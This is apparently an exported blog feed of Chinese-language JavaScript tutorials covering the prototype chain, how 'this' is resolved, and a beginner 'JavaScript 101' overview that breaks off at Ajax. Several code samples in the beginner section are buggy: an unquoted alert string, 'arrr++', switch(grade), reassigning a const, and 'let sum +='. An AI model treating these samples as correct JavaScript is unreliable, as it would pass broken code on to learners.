在 JavaScript 這個程式語言當中，就是透過原型鍊這樣子的機制，把上下關係給串起來，當你在 A 找不到某個東西的時候，就可以到 A 的 parent（也就是 A.__proto__）去找，還是找不到的話就再往上。而原型鍊的盡頭就是Object.prototype，再往上找就是null了。
在寫這篇文章的時候參考了許多資料，我都附在下面了。有些文章會附上精美圖片，但我覺得從圖片開始反而會有點霧煞煞，因為不知道彼此之間的關聯是怎麼來的。
建議大家看完這篇之後可以看一下底下那些參考資料，也順便複習一下自己的觀念是否正確。
參考資料
JavaScript深入之从原型到原型链
JS原型链图解教程
理解JavaScript的原型链和继承
从__proto__和prototype来深入理解JS对象和原型链
Javascript 原型链
彻底理解JavaScript原型

關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>prototype</tag>
      </tags>
  </entry>
  <entry>
    <title>淺談 JavaScript 頭號難題 this：絕對不完整，但保證好懂</title>
    <url>/2019/02/23/javascript-this/</url>
    <content><![CDATA[前言在 JavaScript 裡面，有一個令新手十分頭痛，老手也不一定能完全理解的主題：「this 是什麼？」。身為一個以 JavaScript 當作吃飯工具的前端工程師，我也被這個問題困擾了許久。
我原本以為我這輩子都不會寫有關於 this 的文章。
原因有兩個，第一個是講解 this 的文章已經超級無敵多了，而且每一篇都寫得很不錯，之前看完 What’s THIS in JavaScript ? 系列之後覺得講解的很完整，若是沒有把握自己能夠講得更清楚或是以不同的角度切入，似乎就沒必要再寫一篇文章；第二個原因是若是想要「完全」搞懂 this，要付出的成本可能比你想像中要大得多。
這裡所說的「完全」指的是無論在任何情況下，你都有辦法講出為什麼 this 的值是這樣，直接給大家一個範例：
var value = 1;  var foo = &#123;  value: 2,  bar: function () &#123;    return this.value;  &#125;&#125;  //範例1console.log(foo.bar());//範例2console.log((foo.bar)());//範例3console.log((foo.bar = foo.bar)());//範例4console.log((false || foo.bar)());//範例5console.log((foo.bar, foo.bar)());

你能答的出來嗎？如果不行的話，代表你沒有「完全」懂 this。要完全懂 this 之所以要付出的成本很大，就是因為「完全懂 this」指的就是「熟記 ECAMScript 規範」。this 的值是什麼不是我們憑空想像的，其實背後都有完整的定義，而那個定義就是所謂的 ECMAScript 規範，你必須先搞懂這個規範，才有可能完全理解 this 在每個情況下所指涉的對象。
若是你真的很想完全搞懂，推薦你這一篇：JavaScript深入之从ECMAScript规范解读this，我上面的範例就是從這一篇拿來的，想看解答、想理解為什麼的話可以去看這一篇。
既然我前面提了這麼多讓我不寫 this 的理由，怎麼最後我還是跳下來寫了？
因為，在我看了這麼多的文章，吸取了一大堆日月精華並且思考過後，發現如果有個不錯的切入點，或許就可以讓 this 變得不是這麼難懂。以我這篇教的方法，不會讓你把 this 完全搞懂，上面那五個範例你可能會答錯，但基本的題目你依舊可以解的出來。
這也是標題的由來：「絕對不完整，但保證好懂」，此文的目的是希望提供一個不同的角度來看 this，從為什麼會有 this 下手，再用一套規則來解釋 this 的值，至少讓你不再對 this 有誤解，也會知道一些常見的情境底下 this 到底是什麼。
要談 this，要從物件導向開始談（若是你對 JavaScript 的物件導向完全沒概念，你可以先補完相關基礎，並且看完這篇：該來理解 JavaScript 的原型鍊了）
如果你有寫過其他程式語言，你就知道 this 從來都不是一件什麼困難的事。它代表的就是在物件導向裡面，那個 instance 本身。
我舉個例子：
class Car &#123;  setName(name) &#123;    this.name = name  &#125;    getName() &#123;    return this.name  &#125;&#125;  const myCar = new Car()myCar.setName(&#x27;hello&#x27;)console.log(myCar.getName()) // hello

在上面我們宣告了一個 class Car，寫了 setName 跟 getName 兩個方法，在裡面用this.name來取放這個 instance 的屬性。
為什麼要這樣寫？因為這是唯一的方法，不然你要把 name 這個屬性存在哪裡？沒有其他地方讓你存了。所以 this 的作用在這裡是顯而易見的，所指到的對象就是那個 instance 本身。
以上面的範例來說，myCar.setName(&#39;hello&#39;)，所以 this 就會是myCar。在物件導向的世界裡面，this 的作用就是這麼單純。
或者換句話說，我認為：

一但脫離了物件導向，其實 this 就沒有什麼太大的意義

假設今天 this 只能在 class 裡面使用，那應該就不會有任何問題對吧？你有看過其他程式語言像是寫 Java 或是 C++ 的人在抱怨說 this 很難懂嗎？沒有，因為 this 的作用很單純。
那問題是什麼？問題就是在 JavaScript 裡面，你在任何地方都可以存取到 this。所以在 JavaScript 裡的 this 跟其他程式語言慣用的那個 this 有了差異，這就是為什麼 this 難懂的原因。
儘管 this 的定義不太一樣，但我認為本質上還是很類似的。要理解 this 的第一步就是告訴自己：「一但脫離了物件，就不太需要關注 this 的值，因為沒什麼意義」
沒什麼太大意義的 thisfunction hello()&#123;  console.log(this)&#125;  hello()

this 的值會是什麼？
延續我們前面所講的，在這種情況下我會跟你說 this 沒有任何意義，而且你千萬不要想成 this 會指到hello這個 function，沒有這種事。
只要記得我前面跟你說的：「脫離了物件，this 的值就沒什麼意義」。
在這種很沒意義的情況下，this 的值在瀏覽器底下就會是window，在 node.js 底下會是global，如果是在嚴格模式，this 的值就會是undefined。
這個規則應該滿好記的，幫大家重新整理一下：

嚴格模式底下就都是undefined
非嚴格模式，瀏覽器底下是window
非嚴格模式，node.js 底下是global

這個就是你在其他文章看到的「預設綁定」，但我在這篇不打算用任何專有名詞去談 this。我認為不用這些名詞也不會妨礙你的理解，甚至還有可能讓你更好理解。我也不是說專有名詞不重要，是說可以先把概念學起來，再回過頭來補專有名詞。
一但脫離了物件，this 的值就沒什麼意義，在沒意義的情況底下就會有個預設值，而預設值也很好記，嚴格模式就是undefined，非嚴格模式底下就是全域物件。
更改 this 的值僅管 this 可能有預設的值，但我們可以透過一些方法來改它。這改的方法也很簡單，一共有三種。
前兩種超級類似，叫做call跟apply，這兩種都是能夠呼叫 fucntion 的函式，我舉一個例子給你看比較好懂：
&#x27;use strict&#x27;;function hello(a, b)&#123;  console.log(this, a, b)&#125;  hello(1, 2) // undefined 1 2hello.call(undefined, 1, 2) // undefined 1 2hello.apply(undefined, [1, 2]) // undefined 1 2

我們有一個叫做 hello 的函式，會 log 出 this 的值以及兩個參數。在我們呼叫hello(1, 2)的時候，因為是嚴格模式所以 this 是 undefined，而 a 跟 b 就是 1 跟 2。
當我們呼叫hello.call(undefined, 1, 2)的時候，我們先忽略第一個參數不談，你可以發現他其實跟hello(1, 2)是一樣的。
而 apply 的差別只在於他要傳進去的參數是一個 array，所以上面這三種呼叫 function 的方式是等價的，一模一樣。除了直接呼叫 function 以外，你也可以用 call 或是 apply 去呼叫，差別在於傳參數的方式不同。
call 跟 apply 的差別就是這麼簡單，一個跟平常呼叫 function 一樣，一個用 array 包起來。
那我們剛剛忽略的第一個參數到底是什麼呢？
你可能已經猜到了，就是this的值！
&#x27;use strict&#x27;;function hello(a, b)&#123;  console.log(this, a, b)&#125;  hello.call(&#x27;yo&#x27;, 1, 2) // yo 1 2hello.apply(&#x27;hihihi&#x27;, [1, 2]) // hihihi 1 2

就是如此簡單，你第一個參數傳什麼，裡面 this 的值就會是什麼。儘管原本已經有 this，也依然會被這種方法給覆蓋掉：
class Car &#123;  hello() &#123;    console.log(this)  &#125;&#125;  const myCar = new Car()myCar.hello() // myCar instancemyCar.hello.call(&#x27;yaaaa&#x27;) // yaaaa

原本 this 的值應該要是 myCar 這個 instance，可是卻被我們在使用 call 時傳進去的參數給覆蓋掉了。
除了以上兩種以外，還有最後一種可以改變 this 的方法：bind。
&#x27;use strict&#x27;;function hello() &#123;  console.log(this)&#125;  const myHello = hello.bind(&#x27;my&#x27;)myHello() // my

bind 會回傳一個新的 function，在這邊我們把 hello 這個 function 用 my 來綁定，所以最後呼叫 myHello() 時會輸出 my。
以上就是三種可以改變 this 的值的方法。你可能會好奇如果我們把 call 跟 bind 同時用會怎樣：
&#x27;use strict&#x27;;function hello() &#123;  console.log(this)&#125;  const myHello = hello.bind(&#x27;my&#x27;)myHello.call(&#x27;call&#x27;) // my

答案是不會改變，一但 bind 了以後值就不會改變了。
這邊還要特別提醒的一點是在非嚴格模式底下，無論是用 call、apply 還是 bind，你傳進去的如果是 primitive 都會被轉成 object，舉例來說：
function hello() &#123;  console.log(this)&#125;  hello.call(123) // [Number: 123]const myHello = hello.bind(&#x27;my&#x27;)myHello() // [String: &#x27;my&#x27;]

幫大家做個中場總結：

在物件以外的 this 基本上沒有任何意義，硬要輸出的話會給個預設值
可以用 call、apply 與 bind 改變 this 的值

物件中的 this最前面我們示範了在物件導向 class 裡面的 this，但在 JavaScript 裡面還有另外一種方式也是物件：
const obj = &#123;  value: 1,  hello: function() &#123;    console.log(this.value)  &#125;&#125;  obj.hello() // 1

這種跟一開始的物件導向範例不太一樣，這個範例是直接創造了一個物件而沒有透過 class，所以你也不會看到 new 這個關鍵字的存在。
再繼續往下講之前，要大家先記住一件事情：

this 的值跟作用域跟程式碼的位置在哪裡完全無關，只跟「你如何呼叫」有關

這個機制恰巧跟作用域相反，不確定我在說什麼的可以先看這篇：所有的函式都是閉包：談 JS 中的作用域與 Closure。
舉個簡單的例子來幫大家複習一下作用域：
var a = 10function test()&#123;  console.log(a)&#125;  const obj = &#123;  a: &#x27;ojb&#x27;,  hello: function() &#123;    test() // 10  &#125;,  hello2: function() &#123;    var a = 200    test() // 10  &#125;&#125;  test() // 10obj.hello()obj.hello2()

無論我在哪裡，無論我怎麼呼叫test這個 function，他印出來的 a 永遠都會是全域變數的那個 a，因為作用域就是這樣運作，test 在自己的作用域裡面找不到 a 於是往上一層找，而上一層就是 global scope，這跟你在哪裡呼叫 test 一點關係都沒有。test 這個 function 在「定義」的時候就把 scope 給決定好了。
但 this 卻是完全相反，this 的值會根據你怎麼呼叫它而變得不一樣，還記得我們剛講過的 call、apply 跟 bind 嗎？這就是其中一個範例，你可以用不同的方式去呼叫 function，讓 this 的值變得不同。
所以你要很清楚知道這是兩種完全不同的運行模式，一個是靜態（作用域）、一個是動態（this）。要看作用域，就看這個函式在程式碼的「哪裡」；要看 this，就看這個函式「怎麽」被呼叫。
舉一個最常見的範例：
const obj = &#123;  value: 1,  hello: function() &#123;    console.log(this.value)  &#125;&#125;  obj.hello() // 1const hey = obj.hellohey() // undefined

明明就是同一個函式，怎麼第一次呼叫時 this.value 是 1，第二次呼叫時就變成 undefined 了？
記住我剛說的話：「要看 this，就看這個函式『怎麽』被呼叫」。
再繼續往下講之前，先教大家一個最重要的小撇步，是我從this 的值到底是什么？一次说清楚學來的，是一個很方便的方法。
其實我們可以把所有的 function call，都轉成利用call的形式來看，以上面那個例子來說，會是這樣：
const obj = &#123;  value: 1,  hello: function() &#123;    console.log(this.value)  &#125;&#125;  obj.hello() // 1obj.hello.call(obj) // 轉成 callconst hey = obj.hellohey() // undefinedhey.call() // 轉成 call

而規則就是你在呼叫 function 以前是什麼東西，你就把它放到後面去。所以obj.hello()就變成了obj.hello.call(obj)，hey()前面沒有東西，所以就變成了hey.call()。
轉成這樣子的形式之後，還記得 call 的第一個參數就是 this 嗎？所以你就能立刻知道 this 的值是什麼了！
舉一個更複雜的例子：
const obj = &#123;  value: 1,  hello: function() &#123;    console.log(this.value)  &#125;,  inner: &#123;    value: 2,    hello: function() &#123;      console.log(this.value)    &#125;  &#125;&#125;  const obj2 = obj.innerconst hello = obj.inner.helloobj.inner.hello()obj2.hello()hello()

你可以不要往下拉，先想一下那三個 function 會各自印出什麼值。
接著我要公布解答了，只要轉成我們上面講的那種形式就好：
obj.inner.hello() // obj.inner.hello.call(obj.inner) =&gt; 2obj2.hello() // obj2.hello.call(obj2) =&gt; 2hello() // hello.call() =&gt; undefined

特別講一下最後一個 hello 因為沒有傳東西進去，所以是預設綁定，在非嚴格模式底下是 window，所以會 log 出window.value也就是 undefined。
只要你把 function 的呼叫轉成用 call 的這種形式，就很容易看出來 this 的值是什麼。
這也是我前面一直在提的：「要看 this，就看這個函式『怎麽』被呼叫」，而你要看怎麼被呼叫的話，就轉成 call 的形式就行了。
學到這邊，其實你看見九成與 this 相關的題目你都會解了，不信的話我們來試試看（為了可讀性沒有防雷空行，所以請自行拉到程式碼就好，再往下拉就會是解答了）：
function hello() &#123;  console.log(this)&#125;  var a = &#123; value: 1, hello &#125;var b = &#123; value: 2, hello &#125;hello()a.hello()b.hello.apply(a)

只要按照我們之前說的，用 call 來轉換一下形式就好：
hello() // hello.call() =&gt; window（瀏覽器非嚴格模式）a.hello() // a.hello.call(a) =&gt; ab.hello.apply(a) =&gt; 直接用 apply，所以就是 a

再來一題比較不一樣的，要看仔細囉（假設在瀏覽器底下跑，非嚴格模式）：
var x = 10var obj = &#123;  x: 20,  fn: function() &#123;    var test = function() &#123;      console.log(this.x)    &#125;    test()  &#125;&#125;  obj.fn()

這題的話如果你搞錯，一定是你忘記了我們最重要的一句話：

要看 this，就看這個函式「怎麽」被呼叫

我們怎麼呼叫 test 的？test()，所以就是test.call()就是預設綁定，this的值就會是 window，所以this.x會是 10，因為在第一行宣告了一個全域變數 x &#x3D; 10。
寫到這裡，再來幫大家做個回顧，避免大家忘記前面在講什麼：

脫離物件的 this 基本上沒有任何意義
沒有意義的 this 會根據嚴格模式以及環境給一個預設值
嚴格模式底下預設就是 undefined，非嚴格模式在瀏覽器底下預設值是 window
可以用 call、apply 與 bind 改變 this 的值
要看 this，就看這個函式「怎麽」被呼叫
可以把 a.b.c.hello() 看成 a.b.c.hello.call(a.b.c)，以此類推，就能輕鬆找出 this 的值

不合群的箭頭函式原本有關 this 的部分應該講到上面就要結束了，但 ES6 新增的箭頭函式卻有不太一樣的運作方式。它本身並沒有 this，所以「在宣告它的地方的 this 是什麼，它的 this 就是什麼」，好，我知道這聽起來超難懂，我們來看個範例：
const obj = &#123;  x: 1,  hello: function()&#123;    // 這邊印出來的 this 是什麼，test 的 this 就是什麼    // 就是我說的：    // 在宣告它的地方的 this 是什麼，test 的 this 就是什麼    console.log(this)         const test = () =&gt; &#123;      console.log(this.x)    &#125;    test()  &#125;&#125;  obj.hello() // 1const hello = obj.hellohello() // undefined

在第五行我們在 hello 這個 function 裡面宣告了 test 這個箭頭函式，所以 hello 的 this 是什麼，test 的 this 就是什麼。
所以當我們呼叫obj.hello()時，test 的 this 就會是 obj；hello()的時候 test 的 this 就會是全域物件。這規則其實都跟之前一樣，差別只有在於說箭頭函式的 this 不是自己決定的，而是取決於在宣告時那個地方的 this。
如果你想看更複雜的範例，可以參考這篇：鐵人賽：箭頭函式 (Arrow functions)
。
實際應用：React你有寫過 React 的話，就會知道裡面其實有些概念今天的教學可以派上用場，舉例來說，我們必須在 constructor 裡面先把一些 method 給 bind 好，你有想過是為什麼嗎？
先來看看如果沒有 bind 的話會發生什麼事：
class App extends React.Component &#123;  onClick() &#123;    console.log(this, &#x27;click&#x27;)  &#125;  render() &#123;    return &lt;button onClick=&#123;this.onClick&#125;&gt;click&lt;/button&gt;  &#125;&#125;

最後 log 出來的值會是 undefined，為什麼？這細節就要看 React 的原始碼了，只有 React 知道實際上在 call 我們傳下去的 onClick 函式時是怎麼呼叫的。
所以為什麼要 bind？為了確保我們在onClick裡面拿到的 this 永遠都是這個 instance 本身。
class App extends React.Component &#123;  constructor() &#123;    super()       // 所以當你把 this.onClick 傳下去時，就已經綁定好了 this    // 而這邊的 this 就是這個 component    this.onClick = this.onClick.bind(this)  &#125;  onClick() &#123;    console.log(this, &#x27;click&#x27;)  &#125;  render() &#123;    return &lt;button onClick=&#123;this.onClick&#125;&gt;click&lt;/button&gt;  &#125;&#125;

還有另外一種方式是用箭頭函式：
class App extends React.Component &#123;  render() &#123;    return &lt;button onClick=&#123;() =&gt; &#123;    	console.log(this)    &#125;&#125;&gt;click&lt;/button&gt;  &#125;&#125;

為什麼箭頭函式也可以？因為我們前面提過，「在宣告它的地方的 this 是什麼，它的 this 就是什麼」，所以這邊 log 出來的 this 就會是 render 這個 function 的 this，而 render 的 this 就是這個 component。
如果你有點忘記了，可以把文章拉到最上面去，因為最上面我們就已經提過這些了。
總結關於講解 this 的文章，我至少看過十幾二十篇，比較常見的就是講幾種不同的綁定方法，以及在哪些時候會用哪一種綁定。但這些我在這篇文章裡都沒有提，因為我認為不影響理解（但最好之後能夠自己去補足相關名詞）。
我也曾經迷惘過，曾經被 this 搞得很混亂，前陣子因為教學的緣故不得不把 this 搞懂，而我也確實比以前理解很多了。從我的經驗看來，我認為 this 之所以複雜，原因之一就是：「在物件以外的地方也可以用 this」，所以我才一再強調我認為物件外的 this 是沒意義的。
我對 this 真正開竅的時候是看到了this 的值到底是什么？一次说清楚這篇文章，簡直就是醍醐灌頂，把一般的 function 呼叫換成用 call 的這種形式是個很容易理解也很容易記的方法，而且可以應用在九成的場景底下。
最後，再次強調這篇文章是有疏漏的，開頭的那幾個範例以這篇文章所學到的知識依然無法解釋，那真的是要看 ECMAScript 才會知道；而瀏覽器的 event 的 this 我也沒提，但這部分比較簡單就是了。我只求這篇文章能讓你知道八成的狀況底下 this 的值會是什麼，其他兩成請另尋高明。
這篇融合了我看過的幾篇文章帶給我的想法，也融合了自己融會貫通後的體悟，希望我也能帶給那些卡在 this 許久的初學者們一些新的想法，在看完這篇文章之後能夠以不同的角度去思考 this 的值以及它存在的意義。
寫完這篇以後，關於 JavaScript 那些非常常見但我以前完全沒弄懂的問題就都解釋的差不多了，有興趣的朋友們可以參考其他的主題：

該來理解 JavaScript 的原型鍊了
深入探討 JavaScript 中的參數傳遞：call by value 還是 reference？
我知道你懂 hoisting，可是你了解到多深？
所有的函式都是閉包：談 JS 中的作用域與 Closure

參考資料：

JavaScript深入之从ECMAScript规范解读this
this 的值到底是什么？一次说清楚
What’s THIS in JavaScript ?
JS this

關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>this</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript 101 快速入門教學</title>
    <url>/2017/01/14/javascript101-tutorial/</url>
    <content><![CDATA[
前言Java 和 JavaScript 雖然名稱相似，但卻是熱狗和狗的差別。JavaScript 是由 Netscape 工程師 Brendan Eich 於 1995 年僅花 10 天所設計的程式語言，也因為一些歷史因素，JavaScript 成為被誤解最深的程式語言。JavaScript 是一種直譯式、基於原型（prototype based）的物件導向程式語言，但又具有函數式程式設計（Functional programming）的特性。其具備簡單好上手、應用範圍廣泛，容易有成就感，但精通不易等特性。過去一段時間 JavaScript 一直被認為是玩具語言，難登大雅之堂。但隨著版本的演進，再加上 NodeJS 的出現，讓 JavaScript 由黑翻紅成為程式語言的當紅巨星，目前雄據在程式語言排行榜前幾名，除了網頁開發外，在許多的領域都可以看到 JavaScript 的身影。本文將快速帶領大家掌握 JavaScript 重要且核心的觀念。
環境建置JavaScript 的檔案只要使用一般的文字編輯器即可編輯（存成 .js 檔案），也可以使用 Sublime Text 等編輯器進行開發，JSBin 這個線上工具進行測試（當然你也可以使用 Chrome、Firefox 等瀏覽器的開發者工具）。除了編輯器外，實際開發上我們也會需要用到 Node.js 開發環境 和 NPM 套件管理系統（按照 Node.js 官方指示即可安裝）。Node.js 是一個開放原始碼、跨平台的、可用於伺服器端和網路應用的執行環境。
JavaScript 程式使用方式（HTML 中引入）
內嵌於 &lt;head&gt;&lt;/head&gt; (因 JS 為直譯式程式語言，讀到即會執行)
 &lt;head&gt; 	&lt;script&gt;		alert(Hello JavaScript);	&lt;/script&gt;&lt;/head&gt;

內嵌於 &lt;body&gt;&lt;/body&gt; 之中 (可以讓 HTML 優先載入)
 &lt;body&gt; &lt;script&gt;	alert(Hello JavaScript);&lt;/script&gt;&lt;/body&gt;

外部引入檔案置於 &lt;head&gt; 或 &lt;body&gt; 內 (推薦使用)
 &lt;script src=&quot;js/main.js&quot;&gt;&lt;/script&gt;

注意外部引入的 &lt;script&gt;&lt;/script&gt; 中不可再寫 JS。
變數在程式語言中變數是一個暫時儲存資料的地方，賦值給變數的值都會有對應的資料型態，然而 JavaScript 是弱型別（Weak type）所以會有自動轉型的情形。
在 JavaScript 中，全域變數將使用 var，而在 ES6 中為了解決變數污染或誤用情形將 block-scope 的變數使用 let，若你需要固定不變的常數則是使用 const。 其中變數型別又分為：Primitive Data Type：String、Number、Boolean（ true 或 false）、undefinded、null，Reference Data Types：Object 兩種，差別在於將物件變數賦值給另外一個變數時是把引用賦值給新變數，所以當新變數更改屬性時會影響到原來物件。
Primitive Data Type：
var num = 12;const str = &#x27;Mark&#x27;;function checkLike() &#123;	let isActived = true;&#125;// console.log 可以讓開發者透過瀏覽器開發者工具看到訊息，方便除錯console.log(num);console.log(str);// 因為 let 是 function block scope，故會產生 &quot;ReferenceError: isActived is not defined 錯誤console.log(isActived);

Reference Data Types：
// 將物件變數賦值給另外一個變數時是把引用賦值給新變數，所以當新變數更改屬性時會影響到原來物件let a = &#123; name: &#x27;Zuck&#x27; &#125;;console.log(a);let b = a;b.name = &#x27;Jack&#x27;;console.log(a);

運算子&#x2F;運算元在程式語言中都需要運算子，在 JavaScript 中有賦值運算子、算數運算子、比較運算子、邏輯運算子等不同運算子。

賦值運算子：使用 = 給定值給變數
 // Markconst name = &#x27;Mark&#x27;;

算數運算子：四則運算
 // 4const sum = 1 + 3;

比較運算子：數值比較
 const age = 23;// trueconst canVote = age &gt;= 20;// falseconst canVote = age &lt; 20;

邏輯運算子：邏輯判斷
 const a = true;const b = true;// 且，要兩個都 trueconst result1 = a &amp;&amp; b;// 或，只要有一個 true，即為 trueconst result2 = a || b;

流程控制（flow control）在 JavaScript 中和許多程式語言一樣有 if...else、switch 條件判斷以及在處理陣列上很常使用的迴圈（當有明確次數時使用 for，當沒有明確數字時使用 while）
另外要注意的是在 JavaScript 中的 falsey 值：undefined、null、NaN、0、&quot;&quot;（空字串）和 false，以上幾種情況在邏輯判斷時會轉換成 false

if…else
 // 可以投票if(age &gt; 20) &#123;	console.log(&#x27;可以投票！&#x27;);&#125;

switch：當條件很多時可以善用 switch 判斷，記得要在每個 case 後寫 break，不然會全部都執行	
 const country = &#x27;Taiwan&#x27;;switch(grade) &#123;	case &#x27;Taiwan&#x27;:		console.log(&#x27;hello&#x27; + country);		break;	case &#x27;Japan&#x27;:		console.log(&#x27;hello&#x27; + country);		break;	case &#x27;Korea&#x27;:		console.log(&#x27;hello&#x27; + country);		break;	default:		console.log(&#x27;hello&#x27; + country);		&#125;

for：當你知道程式需要重複執行幾次時可以使用 for 迴圈
 const arr = [&#x27;Mark&#x27;, &#x27;Zuck&#x27;, &#x27;Jack&#x27;];for(let i = 0; i &lt; arr.length; arrr++) &#123;	console.log(arr[i]);&#125;

while：當你程式不知道需要重複執行幾次時可以使用 while 迴圈
 // 從 1 累加到 10const num = 1;while(num &lt;= 10) &#123;	let sum += num; // sum = sum + num	num += 1;&#125;

do…while：當迴圈次數不明確時，可以使用 while，而 do while 會至少執行一次
 let x = 0;while(x &lt; 10) &#123;	console.log(x);	x++;&#125;let y = 0;do &#123;	console.log(y);	y++;	&#125; while(i &lt; 10);

函式&#x2F;函數（function）函數是一種可以讓一段程式區塊重複使用的程式撰寫方式，在 JavaScript 中函數屬於一級物件（first class object），可以將函數當參數或變數傳遞，其扮演非常重要的角色，也讓 JavaScript 在函數式程式設計（functional programming）上更容易發揮。函數可以傳入參數（如下的 x, y），也有可能沒有。函數使用 return 回傳值，若沒寫則回傳 undefined
function sum(x, y) &#123;	return x + y;&#125;sum(12, 20);

在 ES6 簡化了函數的使用出現了箭頭函數（arrow function）：
const sum = (x, y) =&gt; &#123;	return x + y;&#125;;sum(1, 2);

物件（object）物件是一種儲存資料的資料結構，可以對應成真實世界的物件（有屬性值和方法），一般而言主要有三種建立方式：

使用 new Object
 var obj = new Object();

使用 &#123;&#125;
 var obj = &#123;	name: &#x27;Mark&#x27;,	age: 23&#125;

使用建構函數
 雖然 JavaScript 並非是 class-based 的物件導向程式語言，而是 prototype-based 的物件導向程式語言，但在 JavaScript 可以透過 function 建立類別的宣告函數（在 ES6 中已有 class 可以使用，但只是個語法糖）：
 // 實務上建構函數命名採單字首字大寫。狗狗物件有 name, age 屬性，方法是 wow function Dog(name, age) &#123;	// 屬性值	this.name = name;	this.age = age;	// 每個實例都會有一份方法副本	this.wow = function() &#123;		console.log(&#x27;wow!wow&#x27;);	&#125;&#125;// 多個實例共用，可以減少記憶體等資源運用Dog.prototype.cry = function() &#123;	console.log(&#x27;QQQ&#x27;);&#125;const dog = new Dog(&#x27;lucky&#x27;, 2);// wow!wow!dog.wow();

DOM &amp; BOM事實上 HTML 可以轉換成一棵物件樹，也稱為 Document Object Model（DOM）。在撰寫網頁應用程式時往往需要操作到瀏覽器元素，我們通常是透過選取我們想要改變的元素（選擇器），然後修改我們的物件屬性

物件模型
 所謂的物件模型（Object Model）對於HTML 網頁來說，是一種規範如何存取HTML 元素、CSS 樣式和 JavaScript 程式碼的一種機制，可以將HTML元素、CSS樣式和 JavaScript 程式碼視為物件

BOM
 
 BOM 就是 Browser Object Model  中文叫做瀏覽器物件模型，window 物件是瀏覽器最頂層物件，其下有 document（DOM）、history、location、navigator、screen 子物件。window 物件不須經過宣告，可直接使用，代表目前瀏覽器視窗。事實上，所有的全域變數、函式、物件，其實都是屬於 window 物件，而 BOM 物件的使用可讓我們操作包含開啟&#x2F;關閉視窗，改變視窗大小，計時器與取得網址、存取瀏覽器屬性等

DOM
 文件物件模型（Document Object Model，DOM）是給 HTML 與 XML 文件使用的一組 API。簡單的說就是將文件（文件可以想成單一網頁）物件化，以便提供一套通用存取的方式來處理文件內容。DOM 提供  HTML 網頁一種存取的方式，可以將 HTML 元素轉換成一棵節點樹，每一個標籤和文字內容是為一個節點，讓我們可以走訪節點 (Nodes) 來存取 HTML 元素 
 &lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;title&gt;My title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;	&lt;h1&gt;My header&lt;/h1&gt;	&lt;a href=&quot;&quot;&gt;My link&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;

 
 要操作 DOM 元素前要選取要操作哪個

根據ID名稱選取 document.getElementById(elementId)

根據元素名稱選取 document.getElementsByTagName(tagName)

根據名稱選取 document.getElementsByName(name) 

根據 Class 名稱選取 document.getElementsByClassName(classname)


 有很多元素符合，回傳的是 NodeList 物件集合，使用 item() 存取 (注意 Element’s’)，迭代使用 forEach 不然就要轉陣列
 document 物件有提供使用 CSS 選擇器來選取元素，效能較好

document.querySelectorAll() 方法  document 物件的 querySelectorAll() 方法可以取得 HTML 的節點陣列或清單，為一個 NodeList 物件（若要使用 map 方法需要轉陣列，不然只能用 forEach ）

document.querySelector() 方法 只會回傳一個符合的元素，沒有就回傳 null


 範例：
 &lt;div class=&quot;info&quot;&gt;&lt;/div&gt;&lt;div class=&quot;info&quot;&gt;&lt;/div&gt;&lt;div id=&quot;danger&quot;&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;	document.querySelector(&#x27;#danger&#x27;).innerHTML = &#x27;&lt;h1&gt;嘿嘿，是我&lt;/h1&gt;&#x27;;	document.querySelectorAll(&#x27;.info&#x27;).forEach((value, index) =&gt; &#123;	  value.innerHTML = &#x27;&lt;h1&gt;坐著打，普天之下排名第二&lt;/h1&gt;&#x27;;	&#125;);&lt;/script&gt;

事件處理（event handler）事件處理（Event Handlers）是 JavaScript 非常重要的功能，事件是用來處理 JavaScript 與 HTML 之間的互動、建立動畫效果並和使用者互動

事件處理簡單說就是當一個事件發生時（網頁載入、按下右鍵等），程式會相對應做出怎樣的處理

例如：當使用者按下按鈕時會觸發 click 的事件（事件發生）並讓按鈕變成紅色（處理事件），這就是一種事件處理機制


事件處理機制事件處理 = 事件種類 + 事件處理方法


事件種類（Event Type）又稱事件名稱 (Event Name)，為一個字串，說明發生了什麼事件，例如：click (點擊)、mousemove (滑鼠滑過)

事件處理（Event Handlers）係指處理事件的函數名稱，當事件發生時要呼叫哪個函數進行處理


// 當發生 click 事件，會發出 alert btn.addEventListener(&#x27;click&#x27;, function() &#123;	  alert(&#x27;被點了!&#x27;);&#125;);  

完整範例：
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;meta charset=&quot;utf-8&quot;&gt;  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width&quot;&gt;  &lt;title&gt;JS Bin&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;button id=&quot;btn&quot;&gt;點我點我&lt;/button&gt;  &lt;script type=&quot;text/javascript&quot;&gt;	const btn = document.querySelector(&#x27;#btn&#x27;);	btn.addEventListener(&#x27;click&#x27;, function() &#123;	  alert(&#x27;被點了!&#x27;);	&#125;);  	  &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;

非同步處理（Ajax）傳統上我們會使用 &lt;form&gt; 表單和後端程式作互動，然而每次提交表單送出請求給伺服器，伺服器接收並處理傳來的表單，然後送回一個新的網頁。使用 Ajax 應用可以僅向伺服器發送並取回必須的數據，並在客戶端採用JavaScript 處理來自伺服器的回應，不僅減少伺服器負擔也加快反應速度
同步 vs. 非同步
依序執行，等到上一個函數任務執行完才能執行下一個

不會因為上一個函數尚未執行完（例如：回傳結果）就卡住，會往下執行下一個任務
什麼是同步&#x2F;非同步？
非同步係指程式不會因為上一個函數尚未執行完（例如：回傳結果）就卡住，會往下執行下一個任務

同步就是要等到上一個函數任務執行完才能執行下一個，是依序執行


由於 DOM 事件處理 和 Ajax 呼叫是非同步處理，所以大部分人會為 JavaScript 貼上非同步程式設計的標籤
什麼是 Ajax？
Ajax 全名：Asynchronous Javascript And XML，指的是一套綜合了多項技術的瀏覽器端網頁開發技術

雖然 Ajax 中使用 XML 為名，不過 Ajax 不是指一種單一的技術。現在許多應用都使用更輕量的 JSON 進行資料傳輸

